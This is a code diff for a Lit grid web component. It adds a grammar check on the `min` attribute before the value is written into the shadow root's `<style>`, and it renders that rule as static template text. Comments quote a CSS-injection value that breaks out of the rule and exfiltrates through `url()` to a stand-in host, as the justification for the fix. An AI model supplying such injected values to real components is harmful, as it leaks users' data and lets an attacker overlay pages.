@@ -1,7 +1,7 @@
-import { customElement, HelixElement } from '@fusion.dev/helix-core'
+import { customElement, HelixElement, reportRuntime } from '@fusion.dev/helix-core'
 import type { CSSResultGroup, PropertyValues, TemplateResult } from 'lit'
-import { html } from 'lit'
 import { property } from 'lit/decorators.js'
+import { html, unsafeStatic } from 'lit/static-html.js'
 import { styles } from './grid-root.css.js'
 
 /**
@@ -17,6 +17,54 @@ import { styles } from './grid-root.css.js'
  * element, and a reset there would undo every `min`.
  */
 const UNINHERITED = '--grid-columns: initial; --_grid-template: initial;'
+
+/** A number with a length unit, or a bare number inside a function. */
+const NUMBER =
+  /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|r?ex|r?ch|r?lh|r?ic|r?cap|%|[sdl]?v(?:w|h|i|b|min|max)|cq(?:w|h|i|b|min|max)|cm|mm|in|pt|pc|q)?$/i
+
+/** What `min` may be built from, one token at a time. */
+const TOKEN = /\s+|(?:calc|clamp|min|max)\(|var\(--[\w-]+|-?(?:\d+\.?\d*|\.\d+)[a-z%]*|[(),+*/-]/giy
+
+/**
+ * `min` as a length the rule may hold, or `undefined` where it is not one.
+ *
+ * **Checked against a grammar before it reaches a stylesheet, and that is a
+ * security fix rather than tidiness.** It is a public attribute written into a
+ * `<style>` element's text, so an unchecked
+ * `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
+ * closed the rule and wrote arbitrary CSS into this component's shadow root,
+ * enough to exfiltrate through `url()` and to lay an invisible plate over the
+ * page. `createSheet` says in its own documentation that consumer input must
+ * not be interpolated into CSS. A grammar rather than an escape: a length is
+ * numbers, units, four math functions, `var()`, operators and balanced
+ * parentheses, and nothing in it can end a declaration.
+ */
+const lengthOf = (value: string | undefined): string | undefined => {
+  const min = value?.trim() ?? ''
+  if (min === '' || min.includes('/*')) {
+    return undefined
+  }
+  if (!min.includes('(')) {
+    return NUMBER.test(min) && /[a-z%]$/i.test(min) ? min : undefined
+  }
+  let depth = 0
+  TOKEN.lastIndex = 0
+  while (TOKEN.lastIndex < min.length) {
+    const at = TOKEN.lastIndex
+    const token = TOKEN.exec(min)?.[0]
+    if (token === undefined || TOKEN.lastIndex === at) {
+      return undefined
+    }
+    if (/\d/.test(token) && /^-?[\d.]/.test(token) && !NUMBER.test(token)) {
+      return undefined
+    }
+    depth += token.endsWith('(') || token.startsWith('var(') ? 1 : token === ')' ? -1 : 0
+    if (depth < 0) {
+      return undefined
+    }
+  }
+  return depth === 0 ? min : undefined
+}
 
 /**
  * @summary A layout that places its children on a grid.
@@ -63,6 +111,9 @@ export class HelixGrid extends HelixElement {
 
   /**
    * A fixed number of equal columns.
+   *
+   * Two to six are plain CSS. Any other count is written into the shadow
+   * root's rule, which the server renders too.
    */
   @property({ reflect: true, type: Number })
   columns?: number
@@ -76,6 +127,10 @@ export class HelixGrid extends HelixElement {
   /**
    * The minimum column width. The grid fits as many columns as the width allows.
    *
+   * A length, such as `12rem`, or `calc()`, `clamp()`, `min()`, `max()` and
+   * `var()` over lengths. Anything else is refused with a warning, and the grid
+   * lays out by `columns`.
+   *
    * Takes precedence over `columns`: a grid that both fixes a count and reflows
    * is two intentions in one element.
    */
@@ -83,7 +138,8 @@ export class HelixGrid extends HelixElement {
   min = ''
 
   /**
-   * Writes the track list into the shadow root's own stylesheet.
+   * The rule the shadow root's own `<style>` holds: the reset, and the track
+   * list `min` or an unlisted `columns` asks for.
    *
    * Into a `<style>` rather than onto `this.style`, and the difference is
    * hydration. An inline style on the host is an attribute the element gives
@@ -91,10 +147,11 @@ export class HelixGrid extends HelixElement {
    * it and hydration reports a mismatch it will not patch up. The shadow root
    * is not part of the tree React hydrates, so a rule written there is free.
    *
-   * The element is filled imperatively because Lit refuses expressions inside
-   * `<style>`: it is an invalid binding location and throws while rendering
-   * rather than at build time. Hence a static, empty element in the template
-   * and its `textContent` set here.
+   * **Static text, so the server renders it.** Lit refuses an expression inside
+   * `<style>`, and a rule filled in after upgrade left a server-rendered `min`
+   * grid in one column until then. `unsafeStatic` joins the text into the
+   * template itself, so it is safe only because `min` passed `lengthOf` and a
+   * count is an integer.
    *
    * It sets a custom property rather than the track list itself. A shadow
    * root's adopted stylesheets cascade *after* its own `<style>` elements, and
@@ -102,50 +159,36 @@ export class HelixGrid extends HelixElement {
    * one in the stylesheet and every `min` grid came out a single column. The
    * stylesheet only ever reads `--_grid-template`, so there is nothing to
    * lose against.
-   *
-   * The consequence is that a server-rendered grid falls back to the
-   * stylesheet's single column until it upgrades. That is why `columns` is also
-   * expressed as plain CSS below: the fixed-count case, which can be enumerated,
-   * needs no JavaScript at all, and only `min` depends on this.
    */
-  private applyTemplate(): void {
-    const sheet = this.renderRoot.querySelector<HTMLStyleElement>('#template')
-    if (!sheet) {
-      return
+  private templateRule(): string {
+    const min = lengthOf(this.min)
+    if (min !== undefined) {
+      return `:host { ${UNINHERITED} --_grid-template: repeat(auto-fit, minmax(min(${min}, 100%), 1fr)); }`
     }
-    /* **`min` is checked against a length before it reaches a stylesheet, and
-       that is a security fix rather than tidiness.** It is a public attribute
-       and it was concatenated into a `<style>` element's text, so
-       `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
-       closed the rule and wrote arbitrary CSS into this component's shadow
-       root. That is enough to exfiltrate through `url()` and to lay an
-       invisible plate over the page.
-     *
-     * `createSheet` says in its own documentation that consumer input must not
-     * be interpolated into CSS, and this was the one place in the library that
-     * did it. A pattern rather than an escape, because a length has a small,
-     * known grammar and anything outside it is a mistake worth ignoring rather
-     * than a string worth repairing. */
-    const length = /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|%|v[hw]|ch|ex|cm|mm|in|pt|pc|q)$/i
-    const min = this.min?.trim() ?? ''
-    sheet.textContent =
-      min !== '' && length.test(min)
-        ? `:host { ${UNINHERITED} --_grid-template: repeat(auto-fit, minmax(min(${min}, 100%), 1fr)); }`
-        : `:host { ${UNINHERITED} }`
+    const count = Number(this.columns)
+    if (Number.isInteger(count) && count > 6) {
+      return `:host { ${UNINHERITED} --_grid-template: repeat(${count}, minmax(0, 1fr)); }`
+    }
+    return `:host { ${UNINHERITED} }`
   }
 
-  /* `updated` alone, and never a `firstUpdated` beside it. Lit puts every
-     initial property into the first `changed`, so the pair runs
-     `applyTemplate` twice on every mount of a grid with a `min`. */
   protected override updated(changed: PropertyValues): void {
     super.updated(changed)
-    if (changed.has('min')) {
-      this.applyTemplate()
+    const min = this.min?.trim() ?? ''
+    if (changed.has('min') && min !== '' && lengthOf(min) === undefined) {
+      reportRuntime({
+        kind: 'refused-length',
+        message:
+          `<helix-grid min="${min}"> is not a length the grid can write, so it lays out by ` +
+          '`columns`. Write a length such as `12rem`, or `calc()`, `clamp()`, `min()`, `max()` ' +
+          'or `var()` over lengths.',
+        tag: this.localName,
+      })
     }
   }
 
   protected override render(): TemplateResult {
-    return html`<style id="template">:host { --grid-columns: initial; --_grid-template: initial; }</style>
+    return html`<style id="template">${unsafeStatic(this.templateRule())}</style>
       <slot></slot>`
   }
 
